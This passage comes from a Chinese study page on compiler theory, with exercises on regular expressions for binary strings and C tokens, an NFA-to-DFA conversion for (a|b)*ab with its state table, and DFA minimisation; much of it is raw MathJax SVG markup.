302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="msup" transform="translate(1667,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mn" transform="translate(2492.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(2992.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(3381.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(3881.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(4159.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(4659.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(5048.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(5437.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="mo" transform="translate(5937.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(6215.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(6715.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g></g></g></svg></mjx-container></p>
<blockquote>
<p>倒数第三个字符为0的由0和1组成的串</p>
</blockquote>
<p>(d)$$0^<em>10^</em>10^<em>10^</em>$$</p>
<blockquote>
<p>只含有三个1，由0和1组成的串</p>
</blockquote>
<p>(e)<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="40.281ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 17804.2 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(389,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(1389,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(1667,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="msup" transform="translate(2667,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mo" transform="translate(3492.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mo" transform="translate(3881.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(4270.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(5270.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(5548.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(6548.6,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(6937.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(7326.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(8326.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(8604.6,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="msup" transform="translate(9604.6,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mo" transform="translate(10430.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(10819.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(11819.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(12097.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(13097.1,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(13486.1,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(13875.1,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(14875.1,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(15153.1,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="msup" transform="translate(16153.1,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="msup" transform="translate(16978.7,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g></g></g></svg></mjx-container></p>
<blockquote>
<p>由偶数个0和偶数个1组成的所有0和1的串</p>
</blockquote>
<p>(f)<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.889ex" height="2.262ex" role="img" focusable="false" viewbox="0 -750 3929.1 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mn"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"/></g><g data-mml-node="mo" transform="translate(533,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g><g data-mml-node="mo" transform="translate(936.6,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"/></g><g data-mml-node="mn" transform="translate(1325.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" transform="translate(500,0)"/></g><g data-mml-node="mo" transform="translate(2325.6,0) translate(0 -0.5)"><path data-c="7C" d="M139 -249H137Q125 -249 119 -235V251L120 737Q130 750 139 750Q152 750 159 735V-235Q151 -249 141 -249H139Z"/></g><g data-mml-node="mn" transform="translate(2603.6,0)"><path data-c="30" d="M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z"/></g><g data-mml-node="msup" transform="translate(3103.6,0)"><g data-mml-node="mo"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"/></g><g data-mml-node="mo" transform="translate(422,413) scale(0.707)"><path data-c="2217" d="M229 286Q216 420 216 436Q216 454 240 464Q241 464 245 464T251 465Q263 464 273 456T283 436Q283 419 277 356T270 286L328 328Q384 369 389 372T399 375Q412 375 423 365T435 338Q435 325 425 315Q420 312 357 282T289 250L355 219L425 184Q434 175 434 161Q434 146 425 136T401 125Q393 125 383 131T328 171L270 213Q283 79 283 63Q283 53 276 44T250 35Q231 35 224 44T216 63Q216 80 222 143T229 213L171 171Q115 130 110 127Q106 124 100 124Q87 124 76 134T64 161Q64 166 64 169T67 175T72 181T81 188T94 195T113 204T138 215T170 230T210 250L74 315Q65 324 65 338Q65 353 74 363T98 374Q106 374 116 368T171 328L229 286Z"/></g></g></g></g></svg></mjx-container>   </p>
<blockquote>
<p>不包含011子串的所有由0和1组成串</p>
</blockquote>
<p>(g)$$(01|1)^<em>0^</em>$$</p>
<blockquote>
<p>不包含001子串的所有由0和1组成的串</p>
</blockquote>
<p><strong>例题2.4：</strong>为下列语言写出正规定义</p>
<p><strong>例题：</strong>C语言中无符号整数如何用正则表达式表示？</p>
<blockquote>
<p>(1|2|……|9)(0|1|2|……|9)*|0</p>
</blockquote>
<p><strong>例题：</strong>C语言中的标识符：以字母或下划线开头，后面跟0个或多个字母、数字、下划线。如何用正则表达式表示。</p>
<blockquote>
<p>(a|b|……|z|A|……|Z|_)(0|1|…|9|a|…..|z|A.…..|Z|_)</p>
</blockquote>
<p><strong>例题：</strong>将下图(a|b)*ab的NFA转换为DFA,并画出状态转移表</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/demo_NFA.png" alt="demo_NFA"></p>
<p>n0={0,1,2,4,7}=A</p>
<p>A–a–&gt;{3,6,7,8,1,2,4}=B</p>
<p>A–b–&gt;{5,6,7,1,2,4}=C</p>
<p>B–a–&gt;{3,6,7,8,1,2,4}=B</p>
<p>B–b–&gt;{5,6,7,9,1,2,4}=D</p>
<p>C–a–&gt;{3,6,7,8,1,2,4}=B</p>
<p>C–b–&gt;{5,6,7,1,2,4}=C</p>
<p>D–a–&gt;{3,6,7,8,1,2,4}=B</p>
<p>D–b–&gt;{5,6,7,1,2,4}=C</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/demo_DFA.png" alt="demo_DFA"></p>
<table>
<thead>
<tr>
<th align="center">状态\字符</th>
<th align="center">a</th>
<th align="center">b</th>
</tr>
</thead>
<tbody><tr>
<td align="center">A</td>
<td align="center">B</td>
<td align="center">C</td>
</tr>
<tr>
<td align="center">B</td>
<td align="center">B</td>
<td align="center">D</td>
</tr>
<tr>
<td align="center">C</td>
<td align="center">B</td>
<td align="center">C</td>
</tr>
<tr>
<td align="center">D</td>
<td align="center">B</td>
<td align="center">C</td>
</tr>
</tbody></table>
<p><strong>例题：</strong>将下图的DFA化为最简DFA</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/demo_min_DFA.png" alt="demo_min_DFA"></p>
<p><strong>例题：</strong>将下图f(i|e)e的DFA化为最简DFA</p>
<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/demo_DFA_1.png" alt="demo_DFA_1"></p>
<p>这个算法的正则表达式是 fee 或者 fie，可以通过 fee 或 fie 到达终结状态。</p>
